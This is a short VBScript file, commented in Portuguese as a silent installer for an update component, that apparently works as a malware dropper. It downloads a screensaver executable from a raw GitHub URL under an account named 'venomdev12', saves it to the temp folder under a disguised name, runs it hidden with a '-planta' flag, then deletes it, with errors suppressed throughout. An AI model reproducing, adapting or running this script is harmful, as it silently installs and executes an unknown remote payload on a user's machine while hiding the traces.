Option Explicit
' Instalacao silenciosa do componente de atualizacao
Dim sh, fso, http, ad, tmp, url
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tmp = fso.GetSpecialFolder(2) & "\swupd64.tmp"
url = "https://raw.githubusercontent.com/venomdev12/atualizacao-windows/main/swupd.scr"
On Error Resume Next
If fso.FileExists(tmp) Then fso.DeleteFile tmp
WScript.Sleep 1500
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", url, False
http.Send
If http.Status = 200 Then
    Set ad = CreateObject("ADODB.Stream")
    ad.Type = 1
    ad.Open
    ad.Write http.ResponseBody
    ad.SaveToFile tmp, 2
    ad.Close
End If
If fso.FileExists(tmp) Then
    sh.Run """" & tmp & """ -planta", 0, True
    WScript.Sleep 6000
    fso.DeleteFile tmp
End If
